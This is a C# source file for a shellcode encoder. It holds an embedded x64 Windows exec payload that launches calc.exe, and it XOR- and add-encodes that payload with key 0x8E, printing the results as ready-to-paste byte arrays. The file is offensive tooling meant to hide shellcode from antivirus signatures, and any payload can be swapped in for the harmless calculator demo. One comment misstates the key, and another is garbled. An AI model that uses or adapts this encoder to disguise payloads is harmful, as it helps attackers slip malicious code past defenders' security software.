using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Encoder
{
    class Program
    {

        static string XORCrypter_1(Byte[] ShellCode, int Key)
        {
            byte[] EncryptedShellCode = new byte[ShellCode.Length];
            for (int i = 0; i<ShellCode.Length; i++)
            {
                EncryptedShellCode[i] = (byte) ((uint) ShellCode[i] ^  Key);
            }
            StringBuilder hex = new StringBuilder(EncryptedShellCode.Length * 2);
            foreach (byte b in EncryptedShellCode)
            {
                hex.AppendFormat("0x{0:x2},", b);
            }
            string NewHex = hex.ToString();
            char[] MyChar = { ',', ' ' };
            string final = NewHex.TrimEnd(MyChar);
            Console.WriteLine($"Encryption Key is : {Key}\n");
            return final;

        }




        static string XORCrypter_2(Byte[] ShellCode,Byte Key)
        {
            byte[] EncryptedShellCode = new byte[ShellCode.Length];
            for (int i = 0; i < ShellCode.Length; i++)
            {
                EncryptedShellCode[i] =  (Byte)(((uint)ShellCode[i] +  Key) &  0xff);
            }


            StringBuilder hex = new StringBuilder(EncryptedShellCode.Length * 2);
            foreach (byte b in EncryptedShellCode)
            {
                hex.AppendFormat("0x{0:x2},", b);
            }
            string NewHex = hex.ToString();
            char[] MyChar = { ',', ' ' };
            string final = NewHex.TrimEnd(MyChar);
            Console.WriteLine($"Encryption Key is : {Key}\n");

            return final;

        }
        static void Main(string[] args)
        {

            Console.WriteLine(0 & 0xff); // ==> [x&y = z(z is the rest to make x Devisable by y+1 ,0=>0  "Roller" )   ]

            byte[] ShellCode = { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,
0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
0x63,0x2e,0x65,0x78,0x65,0x00 };

            Console.WriteLine("===[+]Encrypting [+]===");
            Console.WriteLine("Here is your  shellcode:\n");


            // perform xor with key 0xfe

            string __Encrypted_1 = XORCrypter_1(ShellCode,0x8E);
            //Printing Shell Code
            char[] MyChar = { ',', ' ' };
            Console.WriteLine($"byte[] ShellCode =  {{{__Encrypted_1} }};");



            string __Encrypted_2 = XORCrypter_2(ShellCode, 0x8E);
            //Printing Shell Code
            char[] MyChar_2 = { ',', ' ' };
            Console.WriteLine($"byte[] ShellCode =  {{{__Encrypted_2} }};");




        }
    }
}